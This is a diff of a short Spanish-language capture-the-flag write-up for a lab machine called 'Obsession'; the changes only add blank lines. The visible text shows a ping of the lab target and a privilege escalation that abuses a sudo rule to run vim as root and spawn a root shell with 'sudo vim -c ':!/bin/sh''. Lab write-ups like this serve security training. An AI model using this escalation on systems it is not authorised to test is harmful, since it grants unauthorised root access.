@@ -1,6 +1,9 @@
 Maquina: Obsession
+
 Autor: Juan
+
 Dificultad: Muy Facil
+
 ![Screenshot 2024-11-07 181430](https://github.com/user-attachments/assets/b8abf977-b39a-4d6e-9c3d-12cab1d42aae)
 
 ping 172.17.0.2 -c 1
@@ -24,5 +27,7 @@ sudo -l
 y encontramos que podemos ejecutar vim como root
 
 sudo vim -c ':!/bin/sh'
+
 whoami
+
 ![Screenshot 2024-11-07 182539](https://github.com/user-attachments/assets/d09fcdcc-86cf-4b7a-b90d-0f69d456fd65)
